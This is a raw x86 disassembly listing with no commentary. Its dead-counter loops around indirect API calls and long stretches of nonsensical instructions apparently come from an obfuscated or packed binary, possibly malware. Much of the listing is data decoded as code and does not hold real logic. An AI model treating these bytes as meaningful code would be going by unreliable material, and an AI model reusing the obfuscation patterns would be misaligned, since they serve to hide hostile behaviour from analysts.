  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4245b2,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4245ae
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx+0x69]
  40b0b6:	cmp    cl,ah
  40b0b8:	cs leave 
  40b0ba:	aas    
  40b0bb:	jle    0x40b13b
  40b0bd:	mov    dh,0x7e
  40b0bf:	jle    0x40b13f
  40b0c1:	icebp  
  40b0c2:	inc    eax
  40b0c3:	add    BYTE PTR [esi-0x16],al
  40b0c6:	clc    
  40b0c7:	xchg   ebp,eax
  40b0c8:	sbb    bl,BYTE PTR [edx+edi*1+0x4fa3e1de]
  40b0cf:	xchg   edi,eax
  40b0d0:	call   0x32a376a
  40b0d5:	aad    0xc1
  40b0d7:	inc    esi
  40b0d8:	addr16 adc eax,0xaf84ff0d
  40b0de:	jae    0x40b0c0
  40b0e0:	pop    edi
  40b0e1:	ret    
  40b0e2:	push   0x779dd18d
  40b0e7:	scas   eax,DWORD PTR es:[edi]
  40b0e8:	or     ebx,DWORD PTR [edx]
  40b0ea:	shl    BYTE PTR [esi-0x44],cl
  40b0ed:	test   dl,ch
  40b0ef:	cmp    edx,esp
  40b0f1:	xor    BYTE PTR [eax+0x45],ch
  40b0f4:	jmp    0x40b095
  40b0f6:	inc    eax
  40b0f7:	xor    al,BYTE PTR [esi+0x4bf2992d]
  40b0fd:	pop    ecx
  40b0fe:	jo     0x40b095
  40b100:	push   ds
  40b101:	bound  ecx,QWORD PTR [eax+eax*2]
  40b104:	bound  esp,QWORD PTR [edi+eiz*8+0x47]
  40b108:	lahf   
  40b109:	pop    ebp
  40b10a:	adc    edi,ebp
  40b10c:	stc    
  40b10d:	jl     0x40b177
  40b10f:	pop    ebx
  40b110:	pop    es
  40b111:	pop    ecx
  40b112:	ins    DWORD PTR es:[edi],dx
  40b113:	xor    BYTE PTR [ecx-0x5a],dh
  40b116:	shr    ebx,0x4e
  40b119:	push   ss
  40b11a:	rcl    dl,0x8a
  40b11d:	loope  0x40b0cc
  40b11f:	sub    ecx,DWORD PTR [eax+0x7ed61605]
  40b125:	rcl    BYTE PTR [eax+0x79],cl
  40b128:	imul   ecx,ebp,0xbc48268a
  40b12e:	mov    ebp,0xa8943df7
  40b133:	and    eax,edx
  40b135:	es mov al,0xe8
  40b138:	rol    DWORD PTR [edi+eiz*2],0xdd
  40b13c:	pusha  
  40b13d:	retf   0x51d5
  40b140:	jbe    0x40b18b
  40b142:	xor    DWORD PTR [ebp-0x7],0xffffff82
  40b146:	jo     0x40b1c2
  40b148:	xor    al,0xf8
  40b14a:	jmp    0x40b1c8
  40b14c:	mov    al,ds:0x8fce85c6
  40b151:	pop    ds
  40b152:	inc    esi
  40b153:	add    BYTE PTR [eax],dh
  40b155:	sub    DWORD PTR ds:0x9342010d,0xebf638
  40b15f:	sub    BYTE PTR [ecx+ecx*1],ah
  40b162:	cmp    eax,0x59
  40b165:	xor    ecx,esi
  40b167:	fs pop ds
  40b169:	lds    ebp,FWORD PTR [ecx+0x44]
  40b16c:	push   edx
  40b16d:	cmc    
  40b16e:	aad    0xb
  40b170:	call   0x95b0ac88
  40b175:	mov    gs,WORD PTR [ebx*1+0x644bf6bc]
  40b17c:	sbb    eax,0x83f030f3
  40b181:	daa    
  40b182:	jg     0x40b128
  40b184:	mov    ecx,0xc1f8411e
  40b189:	mov    DWORD PTR [ebp-0x8],esi
  40b18c:	movzx  ecx,BYTE PTR ds:0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0xc8
  40b1ab:	cli    
  40b1ac:	push   ecx
  40b1ad:	pop    es
  40b1ae:	add    DWORD PTR [esi+edi*2],edi
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b226
  40b1b7:	scas   eax,DWORD PTR es:[edi]
  40b1b8:	std    
  40b1b9:	mov    ebx,0xde314693
  40b1be:	pushf  
  40b1bf:	std    
  40b1c0:	pop    ebp
  40b1c1:	ins    BYTE PTR es:[edi],dx
  40b1c2:	fisubr DWORD PTR [ecx-0x2c]
  40b1c5:	daa    
  40b1c6:	dec    ecx
  40b1c7:	xor    al,0x5d
  40b1c9:	lods   eax,DWORD PTR ds:[esi]
  40b1ca:	pushf  
  40b1cb:	jnp    0x40b21c
  40b1cd:	les    ebx,FWORD PTR [esi]
  40b1cf:	adc    dh,BYTE PTR [esi-0x1e0079d0]
  40b1d5:	sub    DWORD PTR [ecx],esi
  40b1d7:	push   edi
  40b1d8:	pop    ebp
  40b1d9:	je     0x40b21d
  40b1db:	gs pop ecx
  40b1dd:	addr16 fcomip st,st(0)
  40b1e0:	pop    ecx
  40b1e1:	sub    eax,0x278cf07e
  40b1e6:	pushf  
  40b1e7:	inc    edi
  40b1e8:	lods   al,BYTE PTR ds:[esi]
  40b1e9:	scas   al,BYTE PTR es:[edi]
  40b1ea:	inc    eax
  40b1eb:	pushf  
  40b1ec:	inc    esi
  40b1ed:	fnsave [esi-0x24]
  40b1f0:	lods   eax,DWORD PTR ds:[esi]
  40b1f1:	push   cs
  40b1f2:	daa    
  40b1f3:	gs cs out dx,eax
  40b1f6:	dec    eax
  40b1f7:	int3   
  40b1f8:	sbb    BYTE PTR [eax+0x55f6616a],dl
  40b1fe:	mov    cl,bh
  40b200:	push   ecx
  40b201:	mov    edi,0x91f68f59
  40b206:	int    0x44
  40b208:	jmp    0x40b1c4
  40b20a:	dec    ebp
  40b20b:	mov    WORD PTR [eax-0x13],ss
  40b20e:	push   ss
  40b20f:	adc    al,0xc5
  40b211:	int3   
  40b212:	in     al,dx
  40b213:	sub    bh,ah
  40b215:	push   ss
  40b216:	ret    
  40b217:	mov    bh,0x92
  40b219:	mov    esi,0xa632cb1f
  40b21e:	push   0x74a3bec4
  40b223:	pop    ecx
  40b224:	xchg   ebp,eax
  40b225:	retf   
  40b226:	push   esp
  40b227:	sub    DWORD PTR [ecx-0x27],edx
  40b22a:	jns    0x40b250
  40b22c:	fiadd  WORD PTR [edx]
  40b22e:	mov    BYTE PTR [esp+ebp*2-0x300a3cbf],dl
  40b235:	push   edx
  40b236:	and    eax,0xa0c770d0
  40b23b:	fidivr DWORD PTR [edx]
  40b23d:	mov    al,ds:0xf761e694
  40b242:	jmp    0xd618:0x20038344
  40b249:	mov    WORD PTR [edx+0x14cf3909],?
  40b24f:	xchg   edi,eax
  40b250:	and    esp,DWORD PTR [ebp+0x6ab7eea5]
  40b256:	ss scas al,BYTE PTR es:[edi]
  40b258:	mov    ds,WORD PTR ds:0xda3a0a96
  40b25e:	jle    0x40b29a
  40b260:	enter  0xfff5,0x7e
  40b264:	add    dh,bh
  40b266:	inc    ebp
  40b267:	out    dx,al
  40b268:	call   0x1d3c48a9
  40b26d:	xchg   ebx,eax
  40b26e:	or     al,0x72
  40b270:	pop    ds
  40b271:	or     ch,BYTE PTR [eax-0x1f0747a5]
  40b277:	jo     0x40b286
  40b279:	aas    
  40b27a:	imul   DWORD PTR [ecx+eax*1-0x17b27459]
  40b281:	sub    DWORD PTR ds:0x4150fd,0x41abda
  40b28b:	xor    ecx,eax
  40b28d:	xor    edi,edi
  40b28f:	or     DWORD PTR ds:0x41236c,edi
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4245ae,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4245ae,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx+0x5be65a33],edx
  40b2e2:	fcmovnbe st,st(1)
  40b2e4:	jl     0x40b33f
  40b2e6:	cmp    al,0x7e
  40b2e8:	jle    0x40b2a0
  40b2ea:	jle    0x40b36a
  40b2ec:	jle    0x40b2d0
  40b2ee:	mov    esi,0x19cc4baa
  40b2f3:	das    
  40b2f4:	sub    DWORD PTR [ebp+eax*1-0x5ebfccc8],edi
  40b2fb:	sbb    al,0xce
  40b2fd:	jecxz  0x40b29e
  40b2ff:	call   0xedaa:0x6dd1e74a
  40b306:	ror    edx,cl
  40b308:	add    DWORD PTR [ebp-0x7e],edi
  40b30b:	sub    esi,DWORD PTR [esi]
  40b30d:	les    ebp,FWORD PTR [eax+0x18]
  40b310:	icebp  
  40b311:	jae    0x40b35a
  40b313:	jmp    0x5788:0xd02a0740
  40b31a:	int3   
  40b31b:	sbb    DWORD PTR [edx],esp
  40b31d:	fdivrp st(5),st
  40b31f:	fwait
  40b320:	shl    edi,cl
  40b322:	or     eax,0xc9d08c3d
  40b327:	js     0x40b307
  40b329:	and    al,0x67
  40b32b:	push   edi
  40b32c:	xlat   BYTE PTR ds:[ebx]
  40b32d:	lods   eax,DWORD PTR ds:[esi]
  40b32e:	dec    esi
  40b32f:	cmp    DWORD PTR [ebp*2-0x6b3bc20b],0xffffffd1
  40b337:	data16 jle 0x40b346
  40b33a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b33b:	inc    ebx
  40b33c:	xor    ch,BYTE PTR [edx]
  40b33e:	mov    al,0x1d
  40b340:	xchg   edx,eax
  40b341:	(bad)  
  40b342:	adc    DWORD PTR [ebx+esi*2+0x1a2b13fe],ecx
  40b349:	loop   0x40b2e6
  40b34b:	jmp    0xf58d8496
  40b350:	cmc    
  40b351:	push   esi
  40b352:	daa    
  40b353:	pop    edx
  40b354:	stos   DWORD PTR es:[edi],eax
  40b355:	out    dx,eax
  40b356:	retf   0x4987
  40b359:	pop    ebx
  40b35a:	call   0x45da:0x29046abe
  40b361:	outs   dx,BYTE PTR ds:[esi]
  40b362:	cmp    al,ch
  40b364:	in     al,dx
  40b365:	cmp    al,0x2a
  40b367:	(bad)  
  40b368:	jge    0x40b2f2
  40b36a:	jecxz  0x40b30b
  40b36c:	inc    esp
  40b36d:	nop
  40b36e:	in     eax,dx
  40b36f:	pop    esi
  40b370:	jmp    DWORD PTR [ecx-0x6007e2d]
  40b376:	test   eax,0xc5d8a533
  40b37b:	lods   al,BYTE PTR ds:[esi]
  40b37c:	mov    bl,0x66
  40b37e:	mov    al,ds:0xa436db28
  40b383:	xor    BYTE PTR [ebx+0x568cba4f],0x54
  40b38a:	shl    BYTE PTR [esp+ebp*1-0x61a1580f],cl
  40b391:	dec    eax
  40b392:	ds inc esi
  40b394:	(bad)  
  40b396:	xchg   esi,eax
  40b397:	sub    ebx,DWORD PTR [esi+ecx*4+0x4c162638]
  40b39e:	mov    cl,0x1e
  40b3a0:	aad    0x29
  40b3a2:	mov    eax,0x36dbe330
  40b3a7:	fsubp  st(0),st
  40b3a9:	mov    cl,0xc2
  40b3ab:	mul    BYTE PTR [ebx]
  40b3ad:	rcl    DWORD PTR [edx+0x78],0x20
  40b3b1:	mov    esp,0xfc1b803
  40b3b6:	test   DWORD PTR [edi-0xfffffb],ecx
  40b3bc:	jne    0x40b3c6
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4245c2,0x0
  40b45f:	mov    eax,ds:0x4245c2
  40b464:	inc    eax
  40b465:	mov    ds:0x4245c2,eax
  40b46a:	cmp    DWORD PTR ds:0x4245c2,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4245c2,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4245c2
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4245c2,eax
  40b4a0:	cmp    DWORD PTR ds:0x4245c2,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4245b6,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	push   esp
  40b53a:	jp     0x40b54f
  40b53c:	les    edx,FWORD PTR [ecx-0x498181c3]
  40b542:	jle    0x40b5c2
  40b544:	jle    0x40b51c
  40b546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b547:	push   cs
  40b548:	test   al,0x7d
  40b54a:	jb     0x40b585
  40b54c:	lock not BYTE PTR [edi*4-0x1d3d2491]
  40b554:	(bad)  
  40b555:	leave  
  40b556:	imul   esi,edx,0xffffff83
  40b559:	jbe    0x40b5b7
  40b55b:	and    eax,DWORD PTR [edi]
  40b55d:	jne    0x40b5c3
  40b55f:	call   0x331f:0x8092578f
  40b566:	nop
  40b567:	mov    ebx,0x460fdeb2
  40b56c:	sbb    BYTE PTR [ebx],cl
  40b56e:	xor    eax,0x24cdb30e
  40b573:	ins    BYTE PTR es:[edi],dx
  40b574:	xchg   ah,al
  40b576:	inc    esi
  40b577:	ss call 0x416c:0xc7dd4750
  40b57f:	pop    ss
  40b580:	mov    eax,ds:0x82d4078
  40b585:	pop    edx
  40b586:	popa   
  40b587:	xchg   BYTE PTR [edx+0x70],ch
  40b58a:	xchg   esi,eax
  40b58b:	loop   0x40b5a3
  40b58d:	jno    0x40b5dc
  40b58f:	out    0x9c,al
  40b591:	adc    al,0xfe
  40b593:	aas    
  40b594:	or     al,0x3e
  40b596:	repz sbb cl,BYTE PTR fs:[ecx-0x11262961]
  40b59e:	jmp    0x40b5a1
  40b5a0:	push   0xfffffff6
  40b5a2:	xchg   ecx,eax
  40b5a3:	ds mov bl,0x9
  40b5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a7:	jl     0x40b600
  40b5a9:	inc    ecx
  40b5aa:	(bad)  
  40b5ab:	pop    eax
  40b5ac:	icebp  
  40b5ad:	pop    ss
  40b5ae:	xlat   BYTE PTR ds:[ebx]
  40b5af:	pop    eax
  40b5b0:	out    0xcb,al
  40b5b2:	adc    eax,0x7b7f8166
  40b5b7:	js     0x40b57f
  40b5b9:	repz mov edx,0xb707e6a3
  40b5bf:	mov    DWORD PTR [eax-0x4c],esi
  40b5c2:	push   es
  40b5c3:	leave  
  40b5c4:	(bad)
  40b5c7:	inc    esi
  40b5c8:	cli    
  40b5c9:	jae    0x40b647
  40b5cb:	div    DWORD PTR [edi+edi*2]
  40b5ce:	std    
  40b5cf:	jbe    0x40b582
  40b5d1:	jl     0x40b640
  40b5d3:	mov    esi,0xc83d5b4a
  40b5d8:	fst    st(0)
  40b5da:	pop    ebx
  40b5db:	aad    0x29
  40b5dd:	retf   
  40b5de:	adc    cl,dl
  40b5e0:	sti    
  40b5e1:	or     al,0xe0
  40b5e3:	mov    ebx,0x4c320449
  40b5e8:	xor    al,0x71
  40b5ea:	push   eax
  40b5eb:	sahf   
  40b5ec:	xchg   esp,eax
  40b5ed:	imul   edi,ebx,0xf1d95607
  40b5f3:	fist   DWORD PTR [ecx+0x6ec2b261]
  40b5f9:	rcr    DWORD PTR [ebx-0x68d00068],0x8e
  40b600:	push   ecx
  40b601:	pushf  
  40b602:	jmp    0x4fdb3d15
  40b607:	jae    0x40b5eb
  40b609:	mov    edi,0xfdb8a24
  40b60e:	test   BYTE PTR [edx+0x5],al
  40b611:	add    BYTE PTR [eax],al
  40b613:	sbb    DWORD PTR ds:0x415115,0x412368
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0x7b,al
  40b632:	lock push esi
  40b634:	adc    ch,cl
  40b636:	xor    bh,BYTE PTR [esi+0x7e]
  40b639:	mov    dh,0x7e
  40b63b:	jle    0x40b6bb
  40b63d:	pushf  
  40b63e:	mov    es,WORD PTR [ebx]
  40b640:	int3   
  40b641:	rol    DWORD PTR [ecx],1
  40b643:	pop    ebp
  40b644:	dec    esi
  40b645:	mov    ds:0xa65d5123,al
  40b64a:	inc    eax
  40b64b:	push   0xffffffb5
  40b64d:	mov    al,0x9c
  40b64f:	test   BYTE PTR [ebx],cl
  40b651:	mov    esi,0xe671aeca
  40b656:	gs or  al,0x35
  40b659:	xchg   DWORD PTR [ebp+ecx*2-0x79],edx
  40b65d:	dec    ecx
  40b65e:	mov    al,0xa5
  40b660:	mov    al,ds:0x10a3564c
  40b665:	sbb    bl,bl
  40b667:	jne    0x40b6c2
  40b669:	sar    DWORD PTR [ecx-0x2a],0x16
  40b66d:	punpckhdq mm5,QWORD PTR [eax+0x2f4c7ffe]
  40b674:	dec    eax
  40b675:	repz cdq 
  40b677:	xchg   BYTE PTR [ebp-0x4b],bh
  40b67a:	dec    esp
  40b67b:	mov    ds:0xb9d3864e,al
  40b680:	shl    BYTE PTR [edx],1
  40b682:	dec    ebp
  40b683:	test   eax,0x495b3f6d
  40b688:	(bad)  
  40b689:	pause  
  40b68b:	(bad)  
  40b68c:	jne    0x40b6ff
  40b68e:	mov    al,ds:0x5e96b2f1
  40b693:	sub    esp,DWORD PTR [ebx-0x3c]
  40b696:	sub    BYTE PTR [ebx-0xe70c990],al
  40b69c:	dec    ecx
  40b69d:	sti    
  40b69e:	idiv   BYTE PTR [ecx-0x39]
  40b6a1:	inc    esp
  40b6a2:	pop    eax
  40b6a3:	xor    eax,0x190a061e
  40b6a8:	xchg   ebx,eax
  40b6a9:	enter  0x399f,0xc6
  40b6ad:	inc    esp
  40b6ae:	mov    bh,0x90
  40b6b0:	adc    al,0xda
  40b6b2:	lock mov cl,0xb
  40b6b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6b6:	adc    ecx,esp
  40b6b8:	jno    0x40b6d8
  40b6ba:	addr16 jo 0x40b6f6
  40b6bd:	pop    ds
  40b6be:	cmp    eax,0xaebfae48
  40b6c3:	or     eax,0xdd1b609e
  40b6c8:	push   ebp
  40b6c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6ca:	add    BYTE PTR [edx+0x3767d340],dl
  40b6d0:	push   bp
  40b6d2:	pop    ecx
  40b6d3:	xchg   ebx,eax
  40b6d4:	imul   ebx,esi,0x4da9ba62
  40b6da:	mov    ebp,DWORD PTR [ebx-0x1]
  40b6dd:	lock fidivr DWORD PTR [eax*1+0x1398fffd]
  40b6e5:	sti    
  40b6e6:	int    0x16
  40b6e8:	cmp    DWORD PTR [edx+0x1a],0x2d55aeea
  40b6ef:	sub    eax,0xca9d0387
  40b6f4:	cmc    
  40b6f5:	xor    DWORD PTR [eax+ebp*4+0x53c69112],esi
  40b6fc:	aas    
  40b6fd:	push   ss
  40b6fe:	call   0x8bcc:0xbefc6a8a
  40b705:	push   DWORD PTR [ebp+0x8]
  40b708:	call   0x40a6ca
  40b70d:	or     DWORD PTR ds:0x41abde,edi
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4245ba,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4245b6,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0xc68923e6
  40b867:	mov    eax,0x7e332109
  40b86c:	jle    0x40b824
  40b86e:	jle    0x40b8ee
  40b870:	jle    0x40b88e
  40b872:	or     eax,0x7b427a00
  40b877:	dec    esp
  40b878:	or     al,0xfd
  40b87a:	push   edx
  40b87b:	aaa    
  40b87c:	add    al,0xf9
  40b87e:	add    al,0xa3
  40b880:	mov    al,ds:0xcc0a40ac
  40b885:	mov    al,ds:0xbaef9918
  40b88a:	rcl    BYTE PTR [ecx],cl
  40b88c:	mov    eax,ds:0x1908d1f3
  40b891:	das    
  40b892:	mov    edi,0x969cf9af
  40b897:	push   esi
  40b898:	mov    al,ds:0xb69a9eb1
  40b89d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b89e:	xlat   BYTE PTR ds:[ebx]
  40b89f:	push   ss
  40b8a0:	mov    eax,ds:0x2b06be9
  40b8a6:	pop    edx
  40b8a7:	pop    esp
  40b8a8:	icebp  
  40b8a9:	(bad)  
  40b8aa:	sar    BYTE PTR [ebx-0x78],1
  40b8ad:	fwait
  40b8ae:	add    eax,0xbbfcd802
  40b8b3:	add    eax,0x289ba504
  40b8b8:	dec    edi
  40b8b9:	and    eax,0xe0f59b80
  40b8be:	rcl    al,cl
  40b8c0:	fldenv [ecx+0x4b4ddc12]
  40b8c6:	lods   eax,DWORD PTR ds:[esi]
  40b8c7:	sbb    DWORD PTR [esi-0x57],0x59
  40b8cb:	rcr    DWORD PTR [eax+ebx*4],cl
  40b8ce:	or     ebp,ebx
  40b8d0:	jp     0x40b868
  40b8d2:	lock pusha 
  40b8d4:	and    DWORD PTR [eax],ecx
  40b8d6:	fs push 0x5deea71c
  40b8dc:	mov    eax,ds:0xf810bcb2
  40b8e2:	ins    BYTE PTR es:[edi],dx
  40b8e3:	push   ecx
  40b8e4:	mov    DWORD PTR [edx-0x48],ecx
  40b8e7:	jb     0x40b8d2
  40b8e9:	push   eax
  40b8ea:	lods   al,BYTE PTR ds:[esi]
  40b8eb:	pusha  
  40b8ec:	ror    dl,0xa0
